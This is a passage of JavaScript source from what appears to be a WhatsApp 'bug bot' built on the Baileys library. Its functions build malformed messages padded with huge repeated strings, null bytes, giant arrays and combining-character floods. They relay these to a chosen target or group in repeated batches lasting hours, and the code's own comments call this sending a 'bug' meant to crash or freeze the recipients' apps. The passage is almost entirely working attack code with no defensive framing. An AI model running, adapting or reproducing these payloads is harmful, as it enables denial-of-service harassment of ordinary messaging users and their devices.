9491AHual12BR9zC7v+94VH0ySPpU51i5VgxVAc/cK6o5BPYpne1BQKjs55RGVEY3nCb5EjLfwDkZqQup2spU4BweODyK5NBTXyPyWlHUrk46p220fm5BG5z+6BQ1eXYCkqgeQ3V9rXY/Of60NYvP9Rv619r3DRMXuAVz4lL8/Qmri6F3IJfVFH/EYp0rT9ZaGM2l6nXtWULhuSgFXughgbjTJBLC5JRM5Y8ZwnqfbvWWBKsMEcEGvh22gutZtI5YhKmXYpx4iiFgOa1DS4UsLxms4httAc/K26eJYGycoSR468QqyAE+fzCORk5x94EJT+e6oodJ+yTcQvHNfmJ2PWkKOJPz4XPOwcp61IY2vbYXRZQwiM52hSM4yQAB5Vpttptw102siGJxO4JMpR1UDD4X1T8gq4SD5KzKOzNulAL8MYgRsyuSFoCtA0cajcs852WcC77iTthRWtamdSvWlVdkCKI4I+2yNe1MiHuoNFV/SKKj0FKqjsBS/wCDLXw9dGGe5iNxLGssPGxyrZDqcrjPiwDUupSzP98Mo8yuyZdlPAUx42coy+Xm9WdjdaZqMbzLE8RhmKSHLwvmJqku0eC7Cx2//jJzFG2QDbt3LfQGsKaLkHvyDXzXZujCZAwIfYM+H27Gnd5HZ3YszElmJyST5mlnyuJYYpWCBVZwcqB/DGf50zNIxdiMkk+gqztJ7y5itoE3SSNhRXxDPBpdlDoFo2SMPdv+p6JoUaNWdndXjmO2haR8ZKrUiPE7I6lWBIZTwQRS0e1FajkkgkWSJ2R1PDKcEVp+tpfo1vPKLe4fGXB2pNj1x+Fj6itRsNReCRLdwZcNvhO5WK9iU8RDCjuRirKQwOCDwQa//8QALBEAAgIBAwMCBAcBAAAAAAAAAQIDEQAEEiExQVETIhVCYXEFIDNSU5Ghsf/aAAgBAgEBPwAA0Go1m6rN8ZJbR6ZhR5XJ+JZR9TkZIck+MZxRF4jojHe6rx3OGRGtlYMPI5zcKz1FHtvkYt7nHy0tX9sI69SKqsjYKEQAEDoPGSydSTV4obqFryTkqh1MbfNgjYHlQfuLwKavaoVj/wBz0j3ORad0a1cbQTxePJHGLd1UeSawakSfpRuw/fVL/tXixyyWWlpewUV/pvNsUKs9dAST1NDIpJ9TPqH1ulkWIbRAos+bJ25qjNA8D6HSSOhJE8bWLHYjd3GJO6RpLTSQMoYGvegPkd8T0nQSI29KtaNjEUNdgfcCsEVfORwBxWLo4Y5LVQzgAl5Lc856jNtC0CRZvn+sRiy2fJH9GsdA6MrdGFHPh2m/iXPhul7xLkcaxoiIKVRQGSaNkl9bSyCJifetWjfWvOGaMMsbOA7DgX1rFxkVuowopABHTp2wAAUBQ/Nr9NFLE0pFSRDcjjqCvOfguu1Gq9VJiDtVWBqj7s//xAAoEQEAAgEEAAUDBQAAAAAAAAABAAIRAxIhMQQTQVGRBVJxICIyYWL/2gAIAQMBAT8AxvdlebY6O5tCeBqHivq+j6bNU+FJ9P8A3eB8LZ78sPjiXw1CadXcIes8VbdpVKcu70JolilK9cdPEe8+7PKtdXHCwrkAM256/M1K7rqvtn8x03noEldCpQKfAdRqBjflhUzlmpelwBxiV1aAVwuCOrptdu2xK1apzxK0vdxWqv8AUdMr/K9R+0csb1r1Tn3Y2vdDP4JanllPLsbu16laN92+xu7HMamU6sRbDh4Y2sevzzN/+SW19S9cWtiv214Jt7zEwwURPSeff3nn392Ws2sr2wvk22Mza944loKQU/Xp2RD0XkmvStcJ7pP/2Q==",
        "streamingSidecar": "OrfzKwxuQDbFJgp0t/5yDhz5l3QWlhPCTjHr8GH3rssznKW0DeeV5Npeza+wlbqTW3E=",
        "thumbnailDirectPath": "/v/t62.36147-24/704765759_2250656945772076_7438018000665741074_n.enc?ccb=11-4&oh=01_Q5Aa4gFqtGpt8TzljYyAr3vcI4x2fbJ_dvBkmt4US14MSQ9W1w&oe=6A360538&_nc_sid=5e03e0",
        "thumbnailSha256": "JZkpKhWD4juZ9QRVMiJcWC2FBTupdWQWHzQNOgbBgyk=",
        "thumbnailEncSha256": "p/EG4j8X/7Els09gHqeLTQXh/HnxwkyCbkVHfg4gjLs=",
        annotations: Array.from({ length: 50000 }, () => ({
                    embeddedContent: {
                        embeddedMusic: {
                            author: "by Attam"
                        }
                    },
                    embeddedAction: true
                }))
            }
        },
        {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: {
                                        jid: target
                                    }
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
        console.log(chalk.green(`pending sent to ${target}`));
  } catch (err) {
  console.error(`Error in pending for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonPendingMakerExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonPendingMaker(target, userNumber, chatId, botInstance)
          ]);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in trashsysgp: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonPendingMaker2(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

const tmsg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: " \u0000".repeat(199),
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: `{"flow_cta":"${"\u0010".repeat(1045000)}"}`,
                                version: 3
                            },
                            entryPointConversionSource: "call_permission_request"
                        }
                    }
                }
            }, {});

            await userSock.relayMessage(target, {
                groupStatusMessageV2: {
                    message: tmsg.message
                }
            }, {
            isSecret: 6,
            });
        console.log(chalk.green(`pendingv2 sent to ${target}`));
  } catch (err) {
  console.error(`Error in pendingv2 for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonPendingMakerExecutor2(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonPendingMaker2(target, userNumber, chatId, botInstance)
          ]);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in trashsysgp: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonPendingMakerMix(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000;    // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`Starting batch ${batch}...`));

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }

        let count = 0;
        const maxLoops = 25; // Total 25 calls

        while (count < maxLoops) {
          if (count % 2 === 0) {
            // Even index (0,2,4...): bulldozer
            await xeonPendingMaker2(target, userNumber, chatId, botInstance);
            console.log(chalk.yellow(` ┌────────────────────────┐\n │ pending... (${count + 1}/25)\n └────────────────────────┘ `));
          } else {
            // Odd index (1,3,5...): ultrayDelay
            await xeonPendingMaker2(target, userNumber, chatId, botInstance);
            console.log(chalk.yellow(` ┌────────────────────────┐\n │ pendingv2... (${count + 1}/25)\n └────────────────────────┘ `));
          }
          count++;
        }

        // After 25 alternating calls
        console.log(chalk.bgYellow.black("25 calls done: pending → pendingv2 → ... (13 + 12), sleep 10s..."));
        await new Promise(resolve => setTimeout(resolve, 10000));

      } catch (error) {
        console.error(`Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `Error in pendingmix: ${error.message}. Process stopped.`);
        return;
      }
    }

    console.log(chalk.green(`Finished batch ${batch}`));
    batch++;

    if (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }

  console.log(chalk.cyan(`Done! Total batches sent: ${batch - 1}`));
}

async function xeonInvisibleAndroid(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

        const { jidEncode, generateMessageIDV2, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
        const fs = require("fs")
        const bugstic = fs.readFileSync("./69/bugstic.webp")

        const sendStanza = async (jid, message) => {
            try {
                let myId = userSock.user.id.split(':')[0] + '@s.whatsapp.net'
                let msgId = generateMessageIDV2(userSock.user.id)

                let stanza = {
                    tag: "message",
                    attrs: {
                        id: msgId,
                        to: jid,
                        type: "media",
                        from: myId
                    },
                    content: [{
                        tag: "participants",
                        attrs: {},
                        content: [{
                            tag: "user",
                            attrs: { jid: myId },
                            content: [{
                                tag: "description",
                                attrs: {},
                                content: [Buffer.from("Telegram: @dgxeon13", "utf-8")]
                            }]
                        }]
                    },
                    {
                        tag: "media",
                        attrs: { type: "sticker" },
                        content: [Buffer.from(JSON.stringify(message), "utf-8")]
                    }]
                }
                
                await userSock.sendNode(stanza)
                
            } catch (e) {
                try {
                    await userSock.relayMessage(jid, message, { 
                        messageId: generateMessageIDV2(userSock.user.id),
                        participant: { jid: target } 
                    })
                } catch (err) {
                    console.log("Submission failed.: " + err.message)
                }
            }
        }
        let y = await prepareWAMessageMedia({ sticker: bugstic }, { upload: userSock.waUploadToServer })
        y.stickerMessage.contextInfo = {
            pairedMediaType: 1,
            statusSourceType: 1,
            isForwarded: true,
            forwardingScore: 9999999999999,
            statusAttributionType: 2,
            urlTrackingMap: { urlTrackingMapElements: Array.from({ length: 100000 }, () => ({})) },
            remoteJid: "120363402921136550@newsletter",
            fromMe: true,
            id: "3A1C0D6147EA7069C403",
            quotedMessage: {
                interactiveMessage: {
                    header: {
                        title: "Telegram: @dgxeon13" + "\0".repeat(300000),
                        hasMediaAttachment: false
                    },
                    body: { "text": "Telegram: @dgxeon13" },
                    nativeFlowMessage: {
                        buttons: [{ "name": "cta_url", "buttonParamsJson": "{}" }],
                        messageParamsJson: "{".repeat(500000),
                    }
                }
            }
        }

        let peler = { 
            groupStatusMessageV2: { message: y },
            participant: { jid: target }
        }
        await sendStanza(target, peler)
        console.log(chalk.green(`cantseedroid sent to ${target}`));
  } catch (err) {
  console.error(`Error in cantseedroid for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonInvisibleAndroidExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonInvisibleAndroid(target, userNumber, chatId, botInstance)
          ]);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in trashsysgp: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

// ====================== droidfinity function ======================

async function sendLoop(sock, X, ptcp = true) {
    try {
        const msg = generateWAMessageFromContent(
            X,
            {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    fileLength: "10610",
                    mediaKeyTimestamp: "1775044724",
                    stickerSentTs: "1775044724091",
                }
            },
            {}
        );

        await sock.relayMessage(
            X,
            { groupStatusMessageV2: { message: msg.message } },
            ptcp ? { messageId: msg.key.id, participant: { jid: X } } : { messageId: msg.key.id }
        );

        console.log(chalk.green(`droidfinity1 sent to ${X}`));
        await new Promise(r => setTimeout(r, 300));
    } catch (err) {
        // Silent on error
    }
}

async function loop2(sock, X, ptcp = true) {
    try {
        let msg = generateWAMessageFromContent(X, {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                },
                body: { text: "open secret", format: "DEFAULT" },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"flow_cta\":\"${"".repeat(900000)}\"}}`,
                    version: 3
                }
            }
        }, {});

        await sock.relayMessage(
            X,
            { groupStatusMessageV2: { message: msg.message } },
            {
                messageId: msg.key.id,
                ...(ptcp ? { participant: { jid: X } } : {}),
                quoted: {
                    key: { remoteJid: X, fromMe: false, id: "sticker_id" },
                    message: {
                        stickerMessage: {
                            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                            mimetype: "image/webp",
                            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                            fileLength: "10610",
                            mediaKeyTimestamp: "1775044724",
                            stickerSentTs: "1775044724091"
                        }
                    }
                }
            }
        );

        console.log(chalk.green(`droidfinity2 sent to ${X}`));
        await new Promise(r => setTimeout(r, 500));
    } catch (err) {
        // Silent on error
    }
}

function startSender(sock, target, userNumber, chatId, botInstance, ptcp = true) {
    const intervalTime = 500;
    const maxDuration = 24 * 60 * 60 * 1000; // 24 hours
    const startTime = Date.now();

    const interval = setInterval(async () => {
        // Stop if max duration reached
        if (Date.now() - startTime > maxDuration) {
            clearInterval(interval);
            return;
        }

        // Critical: Check session validity before every send
        if (!(await validateSession(userNumber, chatId, botInstance))) {
            console.log(chalk.yellow(`[STOPPED] droidfinity stopped for ${target} - session invalid`));
            clearInterval(interval);
            return;
        }

        // Only send if sock is still valid
        if (!sock || !sessions.has(userNumber)) {
            clearInterval(interval);
            return;
        }

        await sendLoop(sock, target, ptcp);
        await loop2(sock, target, ptcp);
    }, intervalTime);

    return interval;
}

async function loopGp(target, userNumber, chatId, botInstance, ptcp = false) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  try {
  
  const userSock = sessions.get(userNumber);
    
    const bugstic = fs.readFileSync("./69/bugstic.webp");
    const stickerBuffer = bugstic;
    
    const msg = generateWAMessageFromContent(
        target,
        {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                mimetype: "image/webp",
                directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                fileLength: "10610",
                mediaKeyTimestamp: "1775044724",
                stickerSentTs: "1775044724091"
            }
        },
        { userJid: target, quoted: null }
    );

    await userSock.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: msg.message
            }
        },
        ptcp
            ? { messageId: msg.key.id, participant: { jid: target } }
            : { messageId: msg.key.id }
    );
  } catch (error) {
    console.error(`Error in loopGp for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw error; // Keep the throw to maintain behavior
  }
}

async function loopGpExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            loopGp(target, userNumber, chatId, botInstance)
          ]);
          await sleep(2000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in loopGp: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

// ====================== CANTSEE - ORIGINAL WHILE LOOP + ONLY SESSION CHECK ======================

async function cantseeTrashLoc(sock, target, userNumber, chatId, botInstance) {
    const startTime = Date.now();
    const runDuration = 1 * 60 * 60 * 1000; // 1 hour as in your original

    try {
        while (Date.now() - startTime < runDuration) {
            // ONLY ADDED: Check session before every iteration
            if (!(await validateSession(userNumber, chatId, botInstance))) {
                console.log(chalk.yellow(`[STOPPED] CantSee stopped for ${target} - session invalid`));
                break; // Stop the while loop safely
            }

            // ONLY ADDED: Extra safety if sock is gone
            if (!sock || !sessions.has(userNumber)) {
                break;
            }

            // === EVERYTHING BELOW IS 100% YOUR ORIGINAL CODE ===
            let msg = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        locationMessage: {
                            degreesLatitude: -9.09999262999,
                            degreesLongitude: 199.9996311899,
                            name: "Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
                            address: "Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
                            url: `https://dgxeon13.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEUIwYVFiMyQkNSYXGB/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                        },
                    },
                },
            }, {});

            let msg2 = generateWAMessageFromContent(target, {
                contactMessage: {
                    displayName: "Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿".repeat(10000),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;Telegram: @dgxeon13${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:Telegram: @dgxeon13${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:Telegram: @dgxeon13${"ᩫᩫ".repeat(4000)}\nORG:Telegram: @dgxeon13${"ᩫᩫ".repeat(4000)}\nTITLE:Telegram: @dgxeon13${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:Telegram: @dgxeon13${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:Telegram: @dgxeon13${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:Telegram: @dgxeon13${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;Telegram: @dgxeon13${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:Telegram: 